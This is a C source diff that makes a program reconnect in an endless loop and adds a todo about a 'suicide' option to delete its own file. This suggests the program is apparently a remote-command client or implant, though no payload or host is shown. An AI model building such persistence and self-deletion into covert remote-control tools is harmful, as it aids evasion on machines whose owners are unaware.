@@ -3,8 +3,8 @@
 #include "functions/functions.h"
 #include "logging/logging.h"
 
-// todo: loop on connection
 // todo: maybe make the features more toggleable
+// todo: add stop option to stop the accept loop, maybe also suicide to delete the physical file.
 
 int main() {
     INITIALIZE_RESULT(res);
@@ -22,16 +22,20 @@ int main() {
     res = initialize_commands();
     HANDLE_ERROR_RESULT(res)
 
-    res = connect_();
-    HANDLE_ERROR_RESULT(res)
+    while (1) {
+        res = connect_();
+        HANDLE_ERROR_RESULT(res)
 
-    WRITE_LOG(WARNING, "Connected", NULL)
-    res = communicate();
-    WRITE_LOG(WARNING, "Disconnected", NULL)
+        WRITE_LOG(WARNING, "Connected", NULL)
+        res = communicate();
+        WRITE_LOG(WARNING, "Disconnected", NULL)
+
+        disconnect();
+
+        HANDLE_ERROR_RESULT(res)
+    }
 
     error_cleanup:
-
-    disconnect();
 
     destroy_module_commands();
 
